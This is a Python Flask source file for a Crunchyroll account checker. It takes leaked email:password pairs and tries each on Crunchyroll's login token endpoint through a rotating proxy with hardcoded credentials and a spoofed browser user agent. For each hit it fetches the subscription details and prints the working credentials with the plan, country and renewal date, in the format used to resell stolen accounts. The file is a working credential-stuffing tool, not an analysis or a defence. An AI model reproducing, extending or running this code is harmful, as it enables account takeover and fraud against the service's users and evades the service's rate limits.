from flask import Flask, request, jsonify
import httpx, asyncio
from datetime import datetime
import pytz

AUTH_HEADER = "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
PROXY_URL = "http://PP_1D1E5YMPFG-country-IN:5vl30ay0@evo-pro.porterproxies.com:61236"

app = Flask(__name__)

async def check_crunchyroll(email, password, use_proxy=True):
    proxy = PROXY_URL if use_proxy else None
    async with httpx.AsyncClient(timeout=30, proxies=proxy if proxy else None) as client:
        try:
            # 1. Login to get etp_rt cookie
            login_headers = {
                "Authorization": AUTH_HEADER,
                "User-Agent": USER_AGENT,
                "Origin": "https://www.crunchyroll.com",
                "Referer": "https://www.crunchyroll.com/login",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            login_data = {
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "offline_access"
            }
            login_res = await client.post(
                "https://www.crunchyroll.com/auth/v1/token",
                data=login_data,
                headers=login_headers
            )
            if login_res.status_code != 200:
                return {"error": f"Login failed: {login_res.text}"}, 401

            # 2. Extract the etp_rt cookie
            etp_rt = login_res.cookies.get("etp_rt")
            if not etp_rt:
                return {"error": "etp_rt cookie not found"}, 401

            # 3. Use etp_rt cookie to get access_token
            token_headers = {
                "Authorization": AUTH_HEADER,
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": USER_AGENT,
                "Origin": "https://www.crunchyroll.com",
                "Referer": "https://www.crunchyroll.com/login",
            }
            token_data = {
                "grant_type": "etp_rt_cookie"
            }
            cookies = {"etp_rt": etp_rt}

            token_res = await client.post(
                "https://www.crunchyroll.com/auth/v1/token",
                data=token_data,
                headers=token_headers,
                cookies=cookies
            )
            if token_res.status_code != 200:
                return {"error": "Token error", "response": token_res.text}, 401

            js = token_res.json()
            token = js.get("access_token")
            account_id = js.get("account_id")
            if not token or not account_id:
                return {"error": "Invalid token/account"}, 400

            # 4. Get subscription info
            sub_headers = {
                "Authorization": f"Bearer {token}",
                "Accept": "application/json",
                "User-Agent": USER_AGENT,
                "Referer": "https://www.crunchyroll.com/login",
                "Origin": "https://www.crunchyroll.com"
            }

            sub_res = await client.get(
                f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
                headers=sub_headers
            )

            try:
                data = sub_res.json()
            except Exception:
                return {"error": "Response was not JSON"}, 502

            return data, 200
        except Exception as e:
            return {"error": str(e)}, 500

def run_async_check(email, password, use_proxy=True):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result, code = loop.run_until_complete(check_crunchyroll(email, password, use_proxy))
    return result, code

def format_summary(data, email, password):
    try:
        sub = data["subscriptions"][0]
        plan = sub.get("plan", {}).get("tier", {}).get("text", "N/A")
        renew_iso = sub.get("nextRenewalDate", "N/A")
        trial = sub.get("plan", {}).get("activeFreeTrial", False)
        country = sub.get("plan", {}).get("countryCode", "Unknown")

        # Format renewal date and days left
        if renew_iso and renew_iso != "N/A":
            renew_dt = datetime.strptime(renew_iso, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
            formatted_renew = renew_dt.strftime("%d-%m-%Y")
            days_left = (renew_dt - datetime.now(pytz.UTC)).days
        else:
            formatted_renew = "N/A"
            days_left = "N/A"

        return (
            f"✅ Premium Account\n"
            f"Acc: {email}:{password}\n"
            f"Country: {country}\n"
            f"Plan: {plan}\n"
            f"Trial: {trial}\n"
            f"Renew: {formatted_renew}\n"
            f"Days Left: {days_left}"
        )
    except Exception as e:
        return f"⛔ Error formatting response: {str(e)}"

@app.route('/chk', methods=['GET', 'POST'])
def chk():
    if request.method == 'POST':
        chk_param = request.form.get("chk") or (request.json and request.json.get("chk"))
        use_proxy = True
    else:  # GET
        chk_param = request.args.get("chk")
        use_proxy = True
    if not chk_param or ':' not in chk_param:
        return jsonify({"error": "Usage: chk=email:pass"}), 400
    email, password = chk_param.split(":", 1)
    result, code = run_async_check(email.strip(), password.strip(), use_proxy)
    if code == 200 and "subscriptions" in result and isinstance(result["subscriptions"], list) and result["subscriptions"]:
        summary = format_summary(result, email.strip(), password.strip())
        return summary, 200, {"Content-Type": "text/plain; charset=utf-8"}
    else:
        if result.get("error"):
            return f"❌ {result.get('error')}", code, {"Content-Type": "text/plain; charset=utf-8"}
        return jsonify(result), code

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
        
